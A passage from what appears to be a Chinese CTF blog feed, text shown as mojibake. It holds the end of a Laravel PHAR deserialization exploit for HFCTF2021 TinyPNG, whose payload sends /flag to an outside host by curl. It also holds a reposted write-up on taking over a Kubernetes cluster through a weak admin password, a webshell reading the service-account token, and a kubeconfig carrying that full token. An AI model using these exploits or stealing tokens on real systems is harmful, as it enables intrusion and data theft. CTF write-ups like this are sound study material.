keyword">class</span> <span class="token class-name-definition class-name">MockConfiguration</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefg'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php $s=base64_encode(file_get_contents("/flag"));system("curl http://xx.xx.xx.xx:5555/?a=".$s);exit; ?>'</span><span class="token punctuation">;</span>    <span class="token variable">$expected</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>MessageBag</span><span class="token punctuation">(</span><span class="token variable">$expected</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar.tar.gz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP2-èµ°ç§"><a href="#HTTP2-èµ°ç§" class="headerlink" title="HTTP2 èµ°ç§"></a>HTTP2 èµ°ç§</h3><p>åŸæ¥ <code>/index.php/image</code> çœŸçš„æ˜¯éé¢„æœŸã€‚</p><p>ZeddYu å¸ˆå‚…çš„æ¨æ–‡é‡Œæœ‰æåˆ° HTTP2 èµ°ç§æ‰æ˜¯é¢„æœŸè§£ã€‚</p><p>æˆ‘è¿™é‡Œè´´ä¸€ä¸‹ 4qE å‘ç»™æˆ‘çš„æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/237140">BlackHatï¼šHTTP è¯·æ±‚èµ°ç§çš„æ–°å˜ä½“ã€æ–°é˜²å¾¡</a></p><p>ç­‰æˆ‘æŠŠèµ°ç§å¤ç°äº†å†æ›´æ–°åšå®¢ 233</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HFCTF2021-TinyPNG&quot;&gt;&lt;a href=&quot;#HFCTF2021-TinyPNG&quot; class=&quot;headerlink&quot; title=&quot;HFCTF2021 TinyPNG&quot;&gt;&lt;/a&gt;HFCTF2021 TinyPNG&lt;/h2&gt;&lt;p&gt;æ„Ÿè°¢ Naiveku</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>åä¸ºäº‘ CTF cloud éé¢„æœŸè§£ä¹‹ k8s æ¸—é€å®æˆ˜</title>
    <link href="https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2020-12-30T04:02:14.000Z</published>
    <updated>2021-10-18T04:10:16.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è½¬è½½è‡ª Annevi</p><p>å½“æ—¶æ‰“æ¯”èµ›çš„æ—¶å€™è§‰å¾—è¿™æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„è¿‡ç¨‹</p><p>è½¬è½½è®°å½•ä¸€ä¸‹</p><h2 id="0x00-é¢˜ç›®å…¥å£å‘ç°"><a href="#0x00-é¢˜ç›®å…¥å£å‘ç°" class="headerlink" title="0x00 é¢˜ç›®å…¥å£å‘ç°"></a>0x00 é¢˜ç›®å…¥å£å‘ç°</h2><p>æ‹¿åˆ°é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªç±»ä¼¼äºæä¾›<code>IaaS</code>æœåŠ¡çš„ç«™ç‚¹ï¼Œæ‰«æäº†ä¸€æ³¢ç›®å½•ï¼Œå‘ç°å‡ ä¸ªæ–‡ä»¶ä»¥åŠè·¯ç”±:</p><pre class="line-numbers language-none"><code class="language-none">phpinfo.phprobots.txtadmin&#x2F;login&#x2F;static&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŒºå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªå­˜åœ¨phpinfoçš„ç¯å¢ƒä¸‹å‘ç°äº†ä¸€ä¸ª<code>beego</code>æ¡†æ¶åç«¯çš„403ç•Œé¢ï¼š</p><p><img src="https://cdn.annevi.cn/image-20201220213938432.png" alt="image-20201220213938432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220213938432.png" class="lozad post-image"></p><p>åˆæ­¥çŒœæµ‹æ˜¯<code>.php</code>çš„æ–‡ä»¶äº¤ç»™äº†nginx fastcgiè¿›è¡Œå¤„ç†ï¼Œè€Œå…¶ä»–è·¯ç”±åˆ™æ˜¯äº¤ç»™äº†<code>beego</code>è¿›è¡Œå¤„ç†ã€‚</p><p>æ¥ç€æˆ‘ä»¬å…ˆçœ‹<code>/admin</code>è·¯ç”±ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªéšè—çš„è¡¨å•</p><p><img src="https://cdn.annevi.cn/image-20201220142429113.png" alt="image-20201220142429113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142429113.png" class="lozad post-image"></p><p>å› æ­¤è‡ªç„¶çš„æƒ³åˆ°ä½¿ç”¨burpsuiteè¿›è¡Œå¼±å£ä»¤çš„çˆ†ç ´ï¼Œå‘ç°å­˜åœ¨å¼±å£ä»¤ <code>admin:admin</code></p><p>ç™»å½•æˆåŠŸåè¿”å›äº†ä¸¤ä¸ªurlï¼Œ ä¸‹è½½ <code>tools.zip</code>ï¼ŒåŒæ—¶æ ¹æ®åå­—çŒœæµ‹<code>/wsproxy</code>æ˜¯ä¸€ä¸ªwebsocketçš„ä»£ç†è·¯ç”±ï¼Œè€ŒæŸ¥çœ‹toolsçš„æºç å‘ç°æ˜¯ä¸€ä¸ªwsproxyçš„å®¢æˆ·ç«¯ç¨‹åºã€‚</p><p><img src="https://cdn.annevi.cn/image-20201220142540954.png" alt="image-20201220142540954" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142540954.png" class="lozad post-image"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿›å…¥å†…ç½‘çš„é€šé“ã€‚</p><h2 id="0x01-wsproxy-è¿›å…¥å†…ç½‘"><a href="#0x01-wsproxy-è¿›å…¥å†…ç½‘" class="headerlink" title="0x01 wsproxy è¿›å…¥å†…ç½‘"></a>0x01 wsproxy è¿›å…¥å†…ç½‘</h2><p>ç›´æ¥å¯¹æ‹¿åˆ°çš„toolsæºç è¿›è¡Œç¼–è¯‘ï¼Œè·å¾—å®¢æˆ·ç«¯è¿æ¥ç¨‹åº</p><p><img src="https://cdn.annevi.cn/image-20201220193029128.png" alt="image-20201220193029128" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193029128.png" class="lozad post-image"></p><p>æ ¹æ®ä½¿ç”¨è¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„å‘½ä»¤è¿æ¥ä¸Šé¢˜ç›®çš„<code>wsproxy</code>,åŒæ—¶å¯†ç ä¸ºtoolsæºç ç›®å½•ä¸‹çš„ <code>pass.txt</code>(UAF)ï¼Œsessionå°±æ˜¯æˆ‘ä»¬ç™»é™†adminåï¼Œé¢˜ç›®ç»™çš„<code>beego session</code></p><p><img src="https://cdn.annevi.cn/image-20201220193124576.png" alt="image-20201220193124576" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193124576.png" class="lozad post-image"></p><p>è¿™æ ·ä¼šåœ¨æœ¬åœ°çš„1080ç«¯å£å¼€å¯ä¸€ä¸ª socks5 ä»£ç†ï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¿å…¥å†…ç½‘ã€‚</p><h2 id="0x02-phpinfoæ³„éœ²k8sé›†ç¾¤ä¿¡æ¯"><a href="#0x02-phpinfoæ³„éœ²k8sé›†ç¾¤ä¿¡æ¯" class="headerlink" title="0x02 phpinfoæ³„éœ²k8sé›†ç¾¤ä¿¡æ¯"></a>0x02 phpinfoæ³„éœ²k8sé›†ç¾¤ä¿¡æ¯</h2><p>ç”±äºè¿™é“é¢˜ç›®çš„åç§° <code>Cloud</code>ä»¥åŠåœ¨<code>phpinfo.php</code> ç¯å¢ƒå˜é‡ ä¸­å‘ç°çš„å¤§é‡serviceçš„ä¿¡æ¯ä»¥åŠ<code>k8s api-server</code>åœ°å€ï¼ŒåŒæ—¶æ ¹æ®ç¯å¢ƒå˜é‡çš„åç§°ä¸å€¼æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªk8sé›†ç¾¤ã€‚è€Œæˆ‘ä»¬çš„é¢˜ç›®å±äºk8sé›†ç¾¤ä¸­çš„ä¸€ä¸ªpodã€‚</p><p><img src="https://cdn.annevi.cn/image-20201220142706608.png" alt="image-20201220142706608" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142706608.png" class="lozad post-image"></p><h2 id="0x03-k8såŸºç¡€æ¶æ„ä»‹ç»"><a href="#0x03-k8såŸºç¡€æ¶æ„ä»‹ç»" class="headerlink" title="0x03 k8såŸºç¡€æ¶æ„ä»‹ç»"></a>0x03 k8såŸºç¡€æ¶æ„ä»‹ç»</h2><p>åœ¨ç»§ç»­æ·±å…¥ä¸‹å»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£k8sçš„ä¸€äº›åŸºç¡€æ¶æ„</p><p><img src="https://cdn.annevi.cn/architecture.png" alt="architecture" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/architecture.png" class="lozad post-image"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒKubernetesé›†ç¾¤ä¸»è¦åˆ†ä¸º <code>Master</code>å’Œ<code>Node</code> ä¸¤éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯å…¸å‹çš„åˆ†å¸ƒå¼æ¶æ„ã€‚</p><p>é¦–å…ˆï¼Œå¤–éƒ¨åº”ç”¨ç¨‹åºé€šè¿‡<code>Api-Server</code>æä¾›çš„ <code>HTTP</code> æ¥å£ä¸<code>Master</code>è¿›è¡Œäº¤äº’ï¼Œè€Œåœ¨ä¸<code>APIs</code>è¿›è¡Œäº¤äº’å‰ï¼Œéœ€è¦ç»è¿‡ä¸€æ­¥è®¤è¯çš„é˜¶æ®µã€‚è€Œ <code>Node</code>ç”±å¤šä¸ª<code>pod</code>ç»„æˆï¼Œ<code>pod</code>ä¸­è¿è¡Œç€çš„ä¾¿æ˜¯å¤§å®¶æ¯”è¾ƒç†Ÿæ‚‰çš„<code>å®¹å™¨</code>(é€šå¸¸æ¥è¯´æ˜¯docker)ï¼Œç¼–å†™çš„æœåŠ¡(app)å°±è¿è¡Œåœ¨è¿™äº›podä¸­çš„å®¹å™¨å†…ã€‚</p><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬è‹¥æ˜¯æƒ³å°†æˆ‘ä»¬çš„podå‘å¸ƒå‡ºå»ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«å…¬å¼€è®¿é—®ï¼Œå°±éœ€è¦äº†è§£<code>æœåŠ¡(Service)</code>ã€‚æˆ‘ä»¬å°†è¿è¡Œåœ¨ä¸€ç»„ <code>Pods</code> ä¸Šçš„åº”ç”¨ç¨‹åºå…¬å¼€ä¸ºç½‘ç»œæœåŠ¡çš„æŠ½è±¡æ–¹æ³•ç§°ä½œ<code>æœåŠ¡</code>ï¼Œ<code>æœåŠ¡</code>ä¸Šä¸€èˆ¬é…ç½®äº†èƒ½å¤Ÿè¢«å…¬å¼€è®¿é—®çš„ <strong>ipåœ°å€</strong>ã€<strong>ç«¯å£æ˜ å°„å…³ç³»</strong>ç­‰ï¼Œé€šè¿‡æœåŠ¡æˆ‘ä»¬å°±èƒ½å¤Ÿè®¿é—®åˆ°ç›¸åº”çš„podsã€‚</p><p>æ¯ä¸€ä¸ª<code>Node</code>ä¸Šéƒ½æœ‰ä¸€ä¸ªè¢«ç§°ä½œ<code>èŠ‚ç‚¹ä»£ç†</code>çš„ç¨‹åº <code>kubelet</code>ï¼Œ<code>Node</code>é€šè¿‡è¯¥ç¨‹åºå‘<code>Api-Server</code>æ±‡æŠ¥èŠ‚ç‚¹ä¿¡æ¯ï¼Œä»¥åŠæ¥å—ç›¸åº”çš„æŒ‡ä»¤ç­‰ã€‚</p><p>ä»ä¸Šé¢çš„æ¶æ„ä¸­ä¸éš¾çœ‹å‡ºï¼Œå¦‚æœæˆ‘ä»¬è¦æ‹¿ä¸‹æ•´ä¸ªé›†ç¾¤ï¼Œä»å¤–éƒ¨çœ‹å®é™…ä¸Šå°±æ˜¯éœ€è¦è·å¾—æš´éœ²åœ¨å¤–çš„<code>api-server</code>æä¾›çš„REST apiçš„è®¿é—®æƒé™ã€‚</p><h2 id="0x04-k8s-è®¤è¯-token-æ³„éœ²-é…ç½®ä¸å½“"><a href="#0x04-k8s-è®¤è¯-token-æ³„éœ²-é…ç½®ä¸å½“" class="headerlink" title="0x04 k8s è®¤è¯ token æ³„éœ² + é…ç½®ä¸å½“"></a>0x04 k8s è®¤è¯ token æ³„éœ² + é…ç½®ä¸å½“</h2><p>é€šè¿‡ä¸Šé¢ä¸€æ­¥æµ…æ˜¾çš„è§£äº†ä¸€ä¸‹k8sçš„åŸºç¡€æ¶æ„ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ç»™çš„ä»£ç†ç¨‹åºè¿æ¥å†…ç½‘ï¼Œè®¿é—®<code>phpinfo</code>ä¸­æ³„éœ²çš„ k8s api-server <code>https://10.247.0.1:443</code>ï¼Œå‘ç°<code>api-server</code>å±…ç„¶æš´éœ²åœ¨ä»£ç†èƒ½å¤Ÿ<strong>ç›´æ¥è®¿é—®</strong>åˆ°çš„ç½‘æ®µä¸Šï¼Œä½†æ˜¯ç›´æ¥è®¿é—®æç¤ºæˆ‘ä»¬401æœªæˆæƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç§å¯èƒ½çš„æ–¹å¼å»é€šè¿‡æ­¤è®¤è¯ã€‚</p><p><img src="https://cdn.annevi.cn/image-20201220142743378.png" alt="image-20201220142743378" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142743378.png" class="lozad post-image"></p><p>æ ¹æ®<code>phpinfo.php</code>æ–‡ä»¶ä¸­çš„å†…å®¹æ¥çœ‹ï¼Œè¯¥é›†ç¾¤ä¸­éƒ¨ç½²äº†å¾ˆå¤šå¾ˆå¤šçš„servicesï¼Œå› æ­¤æˆ‘ä»¬çŒœæµ‹æ‰€æœ‰çš„é¢˜ç›®å®¹å™¨åº”è¯¥éƒ½æ˜¯é€šè¿‡è¿™ä¸ªk8sè¿›è¡Œç¼–æ’ç®¡ç†çš„ã€‚</p><p>åŒæ—¶ç”±äºk8sé›†ç¾¤éƒ¨ç½²çš„æ—¶å€™é»˜è®¤ä¼šåœ¨æ¯ä¸ª<code>pod</code>å®¹å™¨ä¸­æŒ‚è½½tokenæ–‡ä»¶åˆ°<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code><br>æ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–é¢˜ç›®æ‰€æ‹¿åˆ°çš„shellæ‹¿åˆ°è¿™ä¸ªtokenã€‚</p><blockquote><p>ServiceAccount ä¸»è¦åŒ…å«äº†ä¸‰ä¸ªå†…å®¹ï¼šnamespaceã€Token å’Œ CAã€‚namespace æŒ‡å®šäº† pod æ‰€åœ¨çš„ namespaceï¼ŒCA ç”¨äºéªŒè¯ apiserver çš„è¯ä¹¦ï¼Œtoken ç”¨ä½œèº«ä»½éªŒè¯ã€‚å®ƒä»¬éƒ½é€šè¿‡ mount çš„æ–¹å¼ä¿å­˜åœ¨ pod çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå…¶ä¸­ token ä¿å­˜çš„è·¯å¾„æ˜¯ /var/run/secrets/kubernetes.io/serviceaccount/token ï¼Œæ˜¯ apiserver é€šè¿‡ç§é’¥ç­¾å‘ token çš„ base64 ç¼–ç åçš„ç»“æœ</p></blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰åœ¨ <code>webshell_1</code>é¢˜ç›®æ‰€æ‹¿åˆ°çš„webshellï¼Œè·å–åˆ°<code>api-server</code>è®¤è¯token</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;124.70.199.12:32003&#x2F;upload&#x2F;71a6e9b8-90b6-4d4f-9acd-bd91c8bbcc5e.jsp?pwd&#x3D;023&amp;i&#x3D;cat%20&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220143016309.png" alt="image-20201220143016309" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220143016309.png" class="lozad post-image"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†<code>api-server</code>çš„è®¿é—®æƒé™ï¼Œå› æ­¤å°±ç›¸å½“äºæˆ‘ä»¬è·å–äº†k8sé›†ç¾¤ä¸­çš„<code>master</code>æƒé™ã€‚</p><h2 id="0x05-è·å–é›†ç¾¤æ“çºµæƒé™"><a href="#0x05-è·å–é›†ç¾¤æ“çºµæƒé™" class="headerlink" title="0x05 è·å–é›†ç¾¤æ“çºµæƒé™"></a>0x05 è·å–é›†ç¾¤æ“çºµæƒé™</h2><p>æ‹¿åˆ°äº†<code>api-server</code>çš„æƒé™ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿéšå¿ƒæ‰€æ¬²çš„åœ¨é›†ç¾¤ä¸­åšæƒ³åšçš„äº‹äº†~ å…¶å®åšåˆ°è¿™ä¸€æ­¥ï¼Œå¤§æ¦‚å°±æ„è¯†åˆ°è¿™åº”è¯¥æ˜¯ä¸€ä¸ª<strong>å¹³å°æ¼æ´</strong>ï¼Œè€Œä¸æ˜¯æœ¬é¢˜çš„é¢„æœŸè§£æ³•ã€‚å› ä¸ºæ‹¿åˆ°äº†<code>master</code>æƒé™ä¹‹åï¼Œæˆ‘ä»¬å·²ç»èƒ½å¤ŸæŸ¥çœ‹/æ§åˆ¶æ‰€æœ‰çš„<code>Pods</code>(webé¢˜ç›®)ï¼Œéšæ„çš„è·å–æˆ‘ä»¬æƒ³è¦é¢˜ç›®çš„flagã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå·¥å…· <code>kubectl</code>æ¥å¯¹<code>api-server</code>è¿›è¡Œæ“ä½œã€‚</p><p>åˆ›å»ºä¸€ä¸ª<code>k8s.yaml</code>é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼Œtokenå¤„ä¸ºæˆ‘ä»¬ä¸Šé¢æ‹¿åˆ°çš„tokenï¼Œserveråˆ™å¡«å†™ api-serverçš„åœ°å€</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1clusters:- cluster:    insecure-skip-tls-verify: true    server: https:&#x2F;&#x2F;10.247.0.1  name: cluster-namecontexts:- context:    cluster: cluster-name    namespace: test    user: admin  name: admincurrent-context: adminkind: Configpreferences: &#123;&#125;users:- name: admin  user:    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœ¬æœºé€šè¿‡é¢˜ç›®çš„å†…ç½‘ä»£ç† æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿œç¨‹è¿æ¥è¿›å…¥é¢˜ç›®çš„k8sé›†ç¾¤ï¼ŒæˆåŠŸé€šè¿‡è®¤è¯ã€‚</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220194341279.png" alt="image-20201220194341279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220194341279.png" class="lozad post-image"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è®¿é—®<code>k8s api-server</code>çš„æƒé™ï¼Œä¸‹é¢æˆ‘ä»¬å°è¯•å»è·å–<strong>é›†ç¾¤masterå®¿ä¸»æœº</strong>çš„æƒé™ã€‚</p><p>é€šè¿‡æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml version --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220230951253.png" alt="image-20201220230951253" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220230951253.png" class="lozad post-image"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œk8sçš„ç‰ˆæœ¬å·ä¸º <code>v1.15.11</code>ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„<code>k8s</code>æˆæƒé»˜è®¤æ˜¯ä¸ä¼šå¼€å¯<code>RBAC(åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶)</code>çš„ã€‚</p><blockquote><p>åœ¨Kubernetesä¸­ï¼Œæˆæƒæœ‰ABACï¼ˆåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼‰ã€RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰ã€Webhookã€Nodeã€AlwaysDenyï¼ˆä¸€ç›´æ‹’ç»ï¼‰å’ŒAlwaysAllowï¼ˆä¸€ç›´å…è®¸ï¼‰è¿™6ç§æ¨¡å¼ã€‚ä»1.6ç‰ˆæœ¬èµ·ï¼ŒKubernetes é»˜è®¤å¯ç”¨RBACè®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ä»1.8å¼€å§‹ï¼ŒRBACå·²ä½œä¸ºç¨³å®šçš„åŠŸèƒ½ã€‚</p></blockquote><p>å› æ­¤å¦‚æœè¿ç»´åœ¨æ­å»ºé›†ç¾¤ç¯å¢ƒçš„æ—¶å€™ï¼Œæ²¡æœ‰è®¾ç½® <code>--authorization-mode=RBAC</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‹¿ä¸‹é›†ç¾¤ä¸­çš„ä¸€ä¸ª<code>pod</code>çš„shellï¼Œä»è€Œè·å–åˆ°tokenè¿›è¡Œ<code>api-server</code>çš„è®¤è¯ã€‚å¾ˆæ˜¾ç„¶ï¼Œç»è¿‡ä¸Šé¢çš„éªŒè¯ï¼Œ<strong>è¿ç»´åœ¨éƒ¨ç½²ç¯å¢ƒæ—¶å¹¶æ²¡æœ‰å¼€å¯è¯¥è®¿é—®æ§åˆ¶</strong>ã€‚</p><h2 id="0x06-è·å–master-å®¿ä¸»æœºæƒé™"><a href="#0x06-è·å–master-å®¿ä¸»æœºæƒé™" 